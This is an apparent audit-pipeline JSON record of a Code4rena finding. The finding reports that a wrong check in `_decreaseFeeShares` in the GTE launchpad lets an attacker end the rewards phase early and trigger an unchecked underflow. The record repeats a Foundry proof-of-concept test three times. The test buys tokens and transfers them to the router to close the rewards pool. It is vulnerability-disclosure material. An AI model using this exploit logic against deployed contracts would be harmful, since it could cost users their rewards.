@@ -1,0 +1,138 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "GTE Perps and Launchpad_gtn2Umg6KsC",
+    "audit_uid": "gtn2Umg6KsC",
+    "requested_submission_uid": "3JLZHNX2ry4",
+    "requested_finding_uid": "7yYS2jorBMq",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/GTE_Perps_and_Launchpad_gtn2Umg6KsC/20260618_145637/findings.json",
+    "source_submission_uid": "3JLZHNX2ry4",
+    "source_finding_uid": "7yYS2jorBMq",
+    "original_report_path": "GTE Perps and Launchpad_gtn2Umg6KsC\\high_valid_3JLZHNX2ry4.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "3JLZHNX2ry4",
+  "finding_uid": "7yYS2jorBMq",
+  "finding_number": "5",
+  "title": "Wrong cehck in `_decreaseFeeShares` leads to premature ending of the reward phase",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "taticuvostru",
+  "body": "**Description:** Due to incorrect check inside `_decreaseFeeShares` an attacker can force the closure of the rewards pool by decreasing the `totalFeeShare` to 0 either by simply selling immediately after buying or transferring the tokens to gteRouter. This is possible only in the case the  `GTELaunchpadV2Pair` has already been created. Creating `GTELaunchpadV2Pair` can be done by anyone using `GTELaunchpadV2PairFactory`.\n\nThe actual check also prevents closing of the rewards phase after the total shares get to 0 leading to the `totalFeeShare` and `bondingShare` underflow due to unchecked block.\n\n```javascript\n function _decreaseFeeShares(address account, uint256 amount) internal {\n        uint256 share = bondingShare[account];\n        if (share == 0 || account == address(0)) return;\n\n        amount = amount > share ? share : amount;\n\n        emit FeeShareDecreased(account, amount, _incEventNonce());\n\n        unchecked {\n            totalFeeShare -= amount;\n            bondingShare[account] -= amount;\n        }\n\n@>        if (totalFeeShare == 0 && !unlocked) _endRewards(); \n\n        ILaunchpad(launchpad).decreaseStake(account, uint96(amount));\n    }\n```\n\n**Impact:** The impact varies from loss of users rewards to blocking of sell token in case the `GTELaunchpadV2Pair` is not set and `totalFeeShare` is equal to 0, to increasing `totalFeeShare` and `bondingShare` due to unchecked blocks and underflow inside `_decreaseFeeShares` .\n\n**Proof of Concept:** The transfer to gteRouter is possible due to a gap in logic inside `_beforeTokenTransfer`. (The reason for using transfer instead of sell is to simplify the Poc)\nIf the Poc does not work it means the address if the create2 is different.\nThe concept can be demonstrated without the pair contract by transferring tokens which will revert due to `_endRewards` beeing called without a pair.",
+  "proof_of_concept": "```solidity \n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {console} from \"forge-std/Test.sol\";\nimport {SimpleBondingCurve} from \"contracts/launchpad/BondingCurves/SimpleBondingCurve.sol\";\nimport {ERC20} from \"@solady/tokens/ERC20.sol\";\nimport {GTELaunchpadV2PairFactory} from \"contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol\";\nimport {GTELaunchpadV2Pair} from \"contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\";\nimport {LaunchToken} from \"contracts/launchpad/LaunchToken.sol\";\n\n\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    /**\n     * PoC can utilize the following variables to access the relevant contracts:\n     * - factory: ERC1967Factory.sol\n     * - launchpad: Launchpad.sol\n     * - distributor: Distributor.sol\n     * - curve: SimpleBondingCurve.sol\n     * - launchpadLPVault: LaunchpadLPVault.sol\n     * - quoteToken: Quote token used in Launchpad system\n     * - uniV2Router: Uniswap V2 Router used in Launchpad system\n     */\n    function test_submissionValidity() external {\n\n        deal(address(quoteToken), user, 100_000_000_000 ether);\n        uint256 quoteAmountNeededForUser = launchpad.quoteQuoteForBase(token, 200 ether, true);\n\n        // create factory and pair\n        GTELaunchpadV2PairFactory launchpadV2PairFactory = new GTELaunchpadV2PairFactory(owner,address(0),address(0),address(0));\n        address pair = launchpadV2PairFactory.createPair(token,address(quoteToken)); \n        \n        // assign bytecode of the newly created pair to the address of the pair from Launchpad clculation\n        bytes memory code = address(pair).code;\n        address _pair = 0xd370E4bF0dD427FDA9B0c686748615039376e46D; // @note address of pair created using create2\n        vm.etch(_pair, code);\n\n        // set values to pair because etch does not save storage variables so the factory address is set to address(0)\n        vm.prank(address(0));  \n        GTELaunchpadV2Pair(_pair).initialize(token,address(quoteToken), address(launchpad),address(distributor));\n        console.log(\"rewardsPoolActive: \", GTELaunchpadV2Pair(_pair).rewardsPoolActive() );\n\n        // set buy data\n        ILaunchpad.BuyData memory data = ILaunchpad.BuyData({\n            account: user,\n            token: token,\n            recipient: user,\n            amountOutBase: 200 ether, \n            maxAmountInQuote: quoteAmountNeededForUser\n        });\n\n        // buy token and log results\n        console.log(\"gte router : \", launchpad.gteRouter());\n        vm.startPrank(user);\n        quoteToken.approve(address(launchpad), type(uint256).max);\n        launchpad.buy(data);\n\n        // transfer to gteRouter is easier to implement than launchpad.sell \n        ERC20(token).transfer(launchpad.gteRouter(),200 ether);\n        vm.stopPrank();\n\n        console.log(\"rewardsPoolActive: \", GTELaunchpadV2Pair(_pair).rewardsPoolActive() );\n\n    }\n\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/LaunchToken.sol#L147"
+  ],
+  "source_record": {
+    "project_id": "gtn2Umg6KsC",
+    "submission_index": "644",
+    "api_submission_id": "",
+    "uid": "3JLZHNX2ry4",
+    "number": "644",
+    "title": "Wrong cehck in `_decreaseFeeShares` leads to premature ending of the reward phase",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "taticuvostru",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/LaunchToken.sol#L147"
+    ],
+    "body": "**Description:** Due to incorrect check inside `_decreaseFeeShares` an attacker can force the closure of the rewards pool by decreasing the `totalFeeShare` to 0 either by simply selling immediately after buying or transferring the tokens to gteRouter. This is possible only in the case the  `GTELaunchpadV2Pair` has already been created. Creating `GTELaunchpadV2Pair` can be done by anyone using `GTELaunchpadV2PairFactory`.\n\nThe actual check also prevents closing of the rewards phase after the total shares get to 0 leading to the `totalFeeShare` and `bondingShare` underflow due to unchecked block.\n\n```javascript\n function _decreaseFeeShares(address account, uint256 amount) internal {\n        uint256 share = bondingShare[account];\n        if (share == 0 || account == address(0)) return;\n\n        amount = amount > share ? share : amount;\n\n        emit FeeShareDecreased(account, amount, _incEventNonce());\n\n        unchecked {\n            totalFeeShare -= amount;\n            bondingShare[account] -= amount;\n        }\n\n@>        if (totalFeeShare == 0 && !unlocked) _endRewards(); \n\n        ILaunchpad(launchpad).decreaseStake(account, uint96(amount));\n    }\n```\n\n**Impact:** The impact varies from loss of users rewards to blocking of sell token in case the `GTELaunchpadV2Pair` is not set and `totalFeeShare` is equal to 0, to increasing `totalFeeShare` and `bondingShare` due to unchecked blocks and underflow inside `_decreaseFeeShares` .\n\n**Proof of Concept:** The transfer to gteRouter is possible due to a gap in logic inside `_beforeTokenTransfer`. (The reason for using transfer instead of sell is to simplify the Poc)\nIf the Poc does not work it means the address if the create2 is different.\nThe concept can be demonstrated without the pair contract by transferring tokens which will revert due to `_endRewards` beeing called without a pair.",
+    "proof_of_concept": "```solidity \n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {console} from \"forge-std/Test.sol\";\nimport {SimpleBondingCurve} from \"contracts/launchpad/BondingCurves/SimpleBondingCurve.sol\";\nimport {ERC20} from \"@solady/tokens/ERC20.sol\";\nimport {GTELaunchpadV2PairFactory} from \"contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol\";\nimport {GTELaunchpadV2Pair} from \"contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\";\nimport {LaunchToken} from \"contracts/launchpad/LaunchToken.sol\";\n\n\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    /**\n     * PoC can utilize the following variables to access the relevant contracts:\n     * - factory: ERC1967Factory.sol\n     * - launchpad: Launchpad.sol\n     * - distributor: Distributor.sol\n     * - curve: SimpleBondingCurve.sol\n     * - launchpadLPVault: LaunchpadLPVault.sol\n     * - quoteToken: Quote token used in Launchpad system\n     * - uniV2Router: Uniswap V2 Router used in Launchpad system\n     */\n    function test_submissionValidity() external {\n\n        deal(address(quoteToken), user, 100_000_000_000 ether);\n        uint256 quoteAmountNeededForUser = launchpad.quoteQuoteForBase(token, 200 ether, true);\n\n        // create factory and pair\n        GTELaunchpadV2PairFactory launchpadV2PairFactory = new GTELaunchpadV2PairFactory(owner,address(0),address(0),address(0));\n        address pair = launchpadV2PairFactory.createPair(token,address(quoteToken)); \n        \n        // assign bytecode of the newly created pair to the address of the pair from Launchpad clculation\n        bytes memory code = address(pair).code;\n        address _pair = 0xd370E4bF0dD427FDA9B0c686748615039376e46D; // @note address of pair created using create2\n        vm.etch(_pair, code);\n\n        // set values to pair because etch does not save storage variables so the factory address is set to address(0)\n        vm.prank(address(0));  \n        GTELaunchpadV2Pair(_pair).initialize(token,address(quoteToken), address(launchpad),address(distributor));\n        console.log(\"rewardsPoolActive: \", GTELaunchpadV2Pair(_pair).rewardsPoolActive() );\n\n        // set buy data\n        ILaunchpad.BuyData memory data = ILaunchpad.BuyData({\n            account: user,\n            token: token,\n            recipient: user,\n            amountOutBase: 200 ether, \n            maxAmountInQuote: quoteAmountNeededForUser\n        });\n\n        // buy token and log results\n        console.log(\"gte router : \", launchpad.gteRouter());\n        vm.startPrank(user);\n        quoteToken.approve(address(launchpad), type(uint256).max);\n        launchpad.buy(data);\n\n        // transfer to gteRouter is easier to implement than launchpad.sell \n        ERC20(token).transfer(launchpad.gteRouter(),200 ether);\n        vm.stopPrank();\n\n        console.log(\"rewardsPoolActive: \", GTELaunchpadV2Pair(_pair).rewardsPoolActive() );\n\n    }\n\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/gtn2Umg6KsC/submissions/644",
+    "raw": {
+      "auditUid": "gtn2Umg6KsC",
+      "createdAt": "2025-09-19T17:56:28.335Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "pWC7GGbCrsz",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T13:50:11.283Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "7yYS2jorBMq"
+        },
+        {
+          "uid": "srPK3PSSyxo",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T13:50:12.556Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "7yYS2jorBMq"
+        },
+        {
+          "uid": "RFjJGVTnzx7",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-22T17:36:30.367Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "3JLZHNX2ry4",
+          "findingUid": null
+        },
+        {
+          "uid": "E8BRnzui3nm",
+          "userUid": "S427KbaYy5Q",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-10-06T20:50:08.519Z",
+          "type": "validity",
+          "value": "fixed",
+          "submissionUid": null,
+          "findingUid": "7yYS2jorBMq"
+        },
+        {
+          "uid": "xQ3taF6UCi4",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-02T14:59:06.907Z",
+          "type": "credit",
+          "value": "75%",
+          "submissionUid": "3JLZHNX2ry4",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "7yYS2jorBMq",
+        "number": 5,
+        "duplicates": 72
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": "75%",
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2025-12-02T14:59:06.907Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Wrong cehck in `_decreaseFeeShares` leads to premature ending of the reward phase",
+      "uid": "3JLZHNX2ry4",
+      "updatedAt": "2025-09-19T17:56:28.335Z",
+      "user": {
+        "uid": "JXbyR7jczUY",
+        "handle": "taticuvostru"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "**Description:** Due to incorrect check inside `_decreaseFeeShares` an attacker can force the closure of the rewards pool by decreasing the `totalFeeShare` to 0 either by simply selling immediately after buying or transferring the tokens to gteRouter. This is possible only in the case the  `GTELaunchpadV2Pair` has already been created. Creating `GTELaunchpadV2Pair` can be done by anyone using `GTELaunchpadV2PairFactory`.\n\nThe actual check also prevents closing of the rewards phase after the total shares get to 0 leading to the `totalFeeShare` and `bondingShare` underflow due to unchecked block.\n\n```javascript\n function _decreaseFeeShares(address account, uint256 amount) internal {\n        uint256 share = bondingShare[account];\n        if (share == 0 || account == address(0)) return;\n\n        amount = amount > share ? share : amount;\n\n        emit FeeShareDecreased(account, amount, _incEventNonce());\n\n        unchecked {\n            totalFeeShare -= amount;\n            bondingShare[account] -= amount;\n        }\n\n@>        if (totalFeeShare == 0 && !unlocked) _endRewards(); \n\n        ILaunchpad(launchpad).decreaseStake(account, uint96(amount));\n    }\n```\n\n**Impact:** The impact varies from loss of users rewards to blocking of sell token in case the `GTELaunchpadV2Pair` is not set and `totalFeeShare` is equal to 0, to increasing `totalFeeShare` and `bondingShare` due to unchecked blocks and underflow inside `_decreaseFeeShares` .\n\n**Proof of Concept:** The transfer to gteRouter is possible due to a gap in logic inside `_beforeTokenTransfer`. (The reason for using transfer instead of sell is to simplify the Poc)\nIf the Poc does not work it means the address if the create2 is different.\nThe concept can be demonstrated without the pair contract by transferring tokens which will revert due to `_endRewards` beeing called without a pair.",
+      "proofOfConcept": "```solidity \n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {console} from \"forge-std/Test.sol\";\nimport {SimpleBondingCurve} from \"contracts/launchpad/BondingCurves/SimpleBondingCurve.sol\";\nimport {ERC20} from \"@solady/tokens/ERC20.sol\";\nimport {GTELaunchpadV2PairFactory} from \"contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol\";\nimport {GTELaunchpadV2Pair} from \"contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\";\nimport {LaunchToken} from \"contracts/launchpad/LaunchToken.sol\";\n\n\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    /**\n     * PoC can utilize the following variables to access the relevant contracts:\n     * - factory: ERC1967Factory.sol\n     * - launchpad: Launchpad.sol\n     * - distributor: Distributor.sol\n     * - curve: SimpleBondingCurve.sol\n     * - launchpadLPVault: LaunchpadLPVault.sol\n     * - quoteToken: Quote token used in Launchpad system\n     * - uniV2Router: Uniswap V2 Router used in Launchpad system\n     */\n    function test_submissionValidity() external {\n\n        deal(address(quoteToken), user, 100_000_000_000 ether);\n        uint256 quoteAmountNeededForUser = launchpad.quoteQuoteForBase(token, 200 ether, true);\n\n        // create factory and pair\n        GTELaunchpadV2PairFactory launchpadV2PairFactory = new GTELaunchpadV2PairFactory(owner,address(0),address(0),address(0));\n        address pair = launchpadV2PairFactory.createPair(token,address(quoteToken)); \n        \n        // assign bytecode of the newly created pair to the address of the pair from Launchpad clculation\n        bytes memory code = address(pair).code;\n        address _pair = 0xd370E4bF0dD427FDA9B0c686748615039376e46D; // @note address of pair created using create2\n        vm.etch(_pair, code);\n\n        // set values to pair because etch does not save storage variables so the factory address is set to address(0)\n        vm.prank(address(0));  \n        GTELaunchpadV2Pair(_pair).initialize(token,address(quoteToken), address(launchpad),address(distributor));\n        console.log(\"rewardsPoolActive: \", GTELaunchpadV2Pair(_pair).rewardsPoolActive() );\n\n        // set buy data\n        ILaunchpad.BuyData memory data = ILaunchpad.BuyData({\n            account: user,\n            token: token,\n            recipient: user,\n            amountOutBase: 200 ether, \n            maxAmountInQuote: quoteAmountNeededForUser\n        });\n\n        // buy token and log results\n        console.log(\"gte router : \", launchpad.gteRouter());\n        vm.startPrank(user);\n        quoteToken.approve(address(launchpad), type(uint256).max);\n        launchpad.buy(data);\n\n        // transfer to gteRouter is easier to implement than launchpad.sell \n        ERC20(token).transfer(launchpad.gteRouter(),200 ether);\n        vm.stopPrank();\n\n        console.log(\"rewardsPoolActive: \", GTELaunchpadV2Pair(_pair).rewardsPoolActive() );\n\n    }\n\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/LaunchToken.sol#L147",
+      "number": 644,
+      "aiExplanation": null,
+      "_index": 644
+    }
+  }
+}
